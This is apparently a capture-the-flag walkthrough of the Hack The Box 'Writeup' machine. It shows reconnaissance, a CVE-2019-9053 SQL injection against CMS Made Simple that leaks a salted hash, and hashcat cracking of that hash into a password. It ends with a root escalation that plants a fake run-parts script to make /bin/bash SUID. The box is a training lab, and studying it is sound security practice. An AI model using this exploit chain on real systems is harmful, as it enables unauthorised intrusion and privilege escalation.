# Writeup

*Linux* - Writeup is an easy difficulty Linux box with DoS protection in place to prevent brute forcing. A CMS susceptible to a SQL injection vulnerability is found, which is leveraged to gain user credentials. The user is found to be in a non-default group, which has write access to part of the PATH. A path hijacking results in escalation of privileges to root.

------------

## Task 1 

**Submit User Flag**

Let's first run the `nmap` scan.

```sh
nmap -sV -sC 10.10.10.138

Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-27 01:55 CET
Nmap scan report for 10.10.10.138
Host is up (0.025s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.00 seconds
```

This tells us that there exist a `robots.txt` file with a disallowed entry of `/writeup`, and let's visit that.

There I see some writeups from HTB.

Now let's get the headers to see if we can find something valuable there.

```sh
curl -I http://10.10.10.138/writeup/
HTTP/1.1 200 OK
Date: Thu, 27 Mar 2025 00:58:13 GMT
Server: Apache/2.4.25 (Debian)
Set-Cookie: CMSSESSID9d372ef93962=91h1pvi715rrgin4vgs87qkim7; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=utf-8
```

We see a cookie with `CMSSESSID` which makes us believe that there exist a CMS.

After viewing the page source, we see also which CMS is that.

```html
<!doctype html>
<html lang="en_US"><head>
	<title>Home - writeup</title>
	
<base href="http://10.10.10.138/writeup/" />
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
```

So the CMS is `CMS Made Simple`, and since the copyright tag tells us that it is 2014-2019, it makes me believe that this is from the year 2019. Let's search for any vulnerabilities for this CMS on this year.

Google gives us `CVE-2019-9053`, which on `exploitdb` shows that this is a SQL Injection.

Let's download python exploit: `https://github.com/e-renna/CVE-2019-9053/blob/master/exploit.py`.

After executing it a lot of valuable information are found:

```sh
pythhon3 CVE_2019_9053.py -u http://10.10.10.138/writeup

[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

Here we have the hashed password and the salt also.

Create a file with hash and the salt:

```sh
echo '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' > hash
```

Try to hack with hashcat and the rockyou wordlist.

```sh
hashcat -m 20 hash --wordlist /home/hb/Documents/tools/rockyou.txt

62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 20 (md5($salt.$pass))
Hash.Target......: 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807
Time.Started.....: Thu Mar 27 02:25:12 2025 (1 sec)
Time.Estimated...: Thu Mar 27 02:25:13 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/hb/Documents/tools/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 13518.9 kH/s (1.91ms) @ Accel:512 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4718592/14344384 (32.90%)
Rejected.........: 0/4718592 (0.00%)
Restore.Point....: 4194304/14344384 (29.24%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: roganoan -> pequeñatraviesa
Hardware.Mon.#1..: Temp: 60c Util: 23% Core:1725MHz Mem:6000MHz Bus:8
```

And we have the password which is `raykayjay9`.

Let's use that to ssh, and find the user flag.

```sh
ssh jkr@10.10.10.138

jkr@writeup:~$ ls
user.txt
jkr@writeup:~$ cat user.txt 
790660ac9fa3ebe645bbedd8579a6e9f
jkr@writeup:~$ 
```

So the first flag is `790660ac9fa3ebe645bbedd8579a6e9f`.

## Task 2

**Submit Root Flag**

To do this we need to do privilege escalation.

During the enumeration we run the `id` command and check the groups here.

```sh
id

uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
```

All of them beside the `staff` are pretty usual, and checking the documentation about this group on `Debian` we see that it allows users to add local modifications to the system without needing root privileges `/usr/local`.

But, we know that the executables in `/usr/local/bin` are in the PATH variable of all users, and they may override the executables in `/bin` and `/usr/bin`.

Now let's replace a program that `root` is likely to run with a payload that allows us to escalate privileges.

For this we have to know what `root` user might be doing into the machine.

Let's use `pspy` tool which checks the processes without the need for root permissions.

Download the tool on our machine.
```sh
wget https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy32
```

Upload it to the target machine.
```sh
scp pspy32 jkr@10.10.10.138:/tmp
```

Run it on the target machine.
```sh
chmod +x pspy32
./pspy32
```

After logging in via `ssh` on another shell, we see some processes that might be interesting, for example we see that the `PATH` specified before running `run-parts` has the directories that we have access to, from the group `staff`.

```sh
2025/03/26 21:55:33 CMD: UID=0    PID=2600   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /ru
```

Now, let's create our payload as `run-parts` in `/usr/local/bin`, which now we are sure that will be executed as soon as we `ssh` into the machine..

```sh
echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /usr/local/bin/run-
parts

chmod +x /usr/local/bin/run-parts
```

This payload turns the `bash` from a binary to an SUID binary - giving us `root`, as soon as we `ssh` into the machine.

Now `ssh` into the machine and use the modified binary, run also the `-p` flag which maintains the privileges.

```sh
bash-4.4# cat root.txt
4b09bcc59d9dcfb2e86d5cf8a0380153
bash-4.4# 
```

So there is the final flag: `4b09bcc59d9dcfb2e86d5cf8a0380153`.


